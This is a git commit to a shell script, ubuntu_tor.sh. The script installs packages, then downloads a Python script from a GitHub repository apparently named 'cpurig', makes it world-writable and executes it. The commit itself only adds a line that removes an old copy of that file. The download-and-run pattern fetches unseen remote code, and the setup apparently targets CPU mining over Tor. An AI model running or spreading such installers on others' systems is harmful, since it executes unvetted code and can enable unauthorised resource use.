2ea11c73aa5b95024c8de864053a7b80fbd34247
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2019-11-22 11:34:23 +0700

    Update ubuntu_tor.sh

--- ubuntu_tor.sh
+++ ubuntu_tor.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 apt-get install -y git wget screen
 apt-get install -y python python-dev
+rm -rf ubuntu_tor_docker.py
 wget https://raw.githubusercontent.com/ts6aud5vkg/cpurig/master/ubuntu_tor_docker.py
 chmod 777 ubuntu_tor_docker.py
 python ubuntu_tor_docker.py
